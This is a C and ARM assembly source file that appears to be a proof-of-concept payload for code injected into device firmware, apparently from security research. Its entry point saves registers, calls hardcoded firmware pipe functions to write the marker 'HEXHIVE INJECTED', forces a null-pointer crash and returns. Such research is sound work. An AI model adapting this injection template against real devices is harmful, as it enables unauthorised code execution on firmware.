#include "stdlib.h"

typedef int (*spipe_open_t)(int);
typedef int (*spipe_read_t)(int, char*, int, int);
typedef int (*spipe_write_t)(int, char*, int, int);
typedef int (*printk_t)(char*);


[[maybe_unused]] static int spipe_open(int target, int fd){
    spipe_open_t f_spipe_open = (spipe_open_t)target;
    return f_spipe_open(fd);
}

[[maybe_unused]] static int spipe_read(int target, int fd, char* buf, int len, int timeout){
    spipe_read_t f_spipe_read = (spipe_read_t)target;
    return f_spipe_read(fd, buf, len, timeout);
}

[[maybe_unused]] static int spipe_write(int target, int fd, char* buf, int len, int timeout){
    spipe_write_t f_spipe_write = (spipe_write_t)target;
    return f_spipe_write(fd, buf, len, timeout);
}

#define FW_PRINTK(target, fmt, ...) \
    (((printk_t)(int)(target))((fmt), ##__VA_ARGS__))


// void do_stuff(int spipe_open_addr, int spipe_read_addr, int spipe_write_addr, int printk_addr){
//
//     printk_t fn = (printk_t)(void*)printk_addr;
//     fn("Hey, this is us!");
//     // int fd = 9;
//     // char* banner = "Hello!\n";
//     // spipe_open(spipe_open_addr, fd);	
//     // spipe_write(spipe_write_addr, fd, banner, 6, 0);
//     //
//     return;	
// }

[[maybe_unused]] static void do_smc(){
	asm volatile (
        "smc #0\n\t"
        : 
        : 
        : "r0", "r1", "r2", "r3"
    );
}

static __inline__ void store_context(){
    asm volatile (
    "stmdb sp!, {r0-r11, lr}\n\t"
    :
    :
    : "r0","r1","r2","r3","r4","r5","r6","r7",
      "r8","r9","r10","r11","lr","memory"
    );
}

static __inline__ void restore_context(){
    asm volatile(
    "ldmia sp!, {r0-r11}" 
    :
    :
    : "memory"
    );
}

static __inline__ void make_space_stack(){
    asm volatile(
    "sub sp, #100"
    :
    :
    : "memory"
    );
}

static __inline__ void restore_space_stack(){
    asm volatile(
    "add sp, #100"
    :
    :
    : "memory"
    );
}

static __inline__ void ret(){
    asm volatile(
    "pop {pc}"
    :
    :
    : "memory"
    );
}


__attribute__((section(".text.prologue")))
__attribute__((naked))
void _start () {
    store_context();
    make_space_stack();
    // int printk_addr = 0x8ffc9434 | 0x1;
    // int printk_target = 0x905aba98;
    int spipe_open_addr = 0x9022eff2 | 0x1;
    // int spipe_read_addr = 0x9022effe | 0x1;
    int spipe_write_addr = 0x9022f010 | 0x1;    
    
 
    // printk_t fn = (printk_t)(void*)printk_addr;
    // fn("HEXHIVE injected");
    //
    // // char recv_buf[8] = "AAAAAAA";
    //
    spipe_open_t sofn = (spipe_open_t)(void*)spipe_open_addr;
    spipe_write_t swfn = (spipe_write_t)(void*)spipe_write_addr;
    // spipe_read_t srfn = (spipe_read_t)(void*)spipe_read_addr;
    sofn(9);
    swfn(9, "HEXHIVE INJECTED", 17, 0);

    int* a = 0;
    *a = 22;

    // int result = 0;
    // asm volatile ("ldr %0, [sp,#0x88]\n" : "=r" (result) ); 

    // reading does not work properly..
    // srfn(9, recv_buf, 7, 2);
    // fn(recv_buf);

    // do_stuff(spipe_open_addr, spipe_read_addr, spipe_write_addr, printk_addr);
    //
    // int out;
    // __asm__ __volatile__("mov %0, r0" : "=r"(out));
    // if(out == 0xdeadbeef){
    // }
    restore_space_stack();
    restore_context();
    
    asm volatile ("movw    r3,  #20000\n" : : : ); 


    ret();
}


